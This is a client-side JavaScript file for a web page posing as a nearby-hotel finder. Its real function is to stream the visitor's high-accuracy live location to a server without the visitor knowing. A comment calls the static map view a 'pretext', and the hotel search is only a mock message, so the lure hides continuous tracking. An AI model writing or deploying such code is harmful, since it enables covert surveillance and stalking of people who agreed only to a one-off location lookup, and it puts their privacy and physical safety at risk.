const socket = io();
let map, marker;
let hasUpdatedMap = false;

// Initialize map centered on India (default)
map = L.map("map").setView([20, 78], 5);
L.tileLayer("https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png").addTo(map);
marker = L.marker([0, 0]).addTo(map);

function startTracking() {
    if (!navigator.geolocation) {
        alert("Geolocation not supported by your browser");
        return;
    }

    // Hide the overlay
    document.getElementById("permissionOverlay").style.display = "none";
    document.querySelector(".msg").textContent = "Locating nearby hotels...";

    navigator.geolocation.watchPosition(
        (pos) => {
            const { latitude: lat, longitude: lon, accuracy } = pos.coords;

            // Send live data to server
            socket.emit("live-location", { lat, lon, id: socket.id });

            // Update user's map ONLY ONCE (Static View pretext)
            // or we can update the marker but not pan the map to keep it "static-ish" 
            // strict interpretation: User sees their location once, then it stays there.
            if (!hasUpdatedMap) {
                marker.setLatLng([lat, lon]);
                map.setView([lat, lon], 16);
                hasUpdatedMap = true;

                // Mock finding hotels
                setTimeout(() => {
                    document.querySelector(".msg").textContent = "Hotels found nearby!";
                }, 2000);
            }
        },
        (err) => {
            console.error(err);
            alert("Please allow location access to find hotels nearby.");
            // Re-show overlay if denied?
            document.getElementById("permissionOverlay").style.display = "flex";
        },
        {
            enableHighAccuracy: true,
            maximumAge: 0,
            timeout: 5000,
        }
    );
}
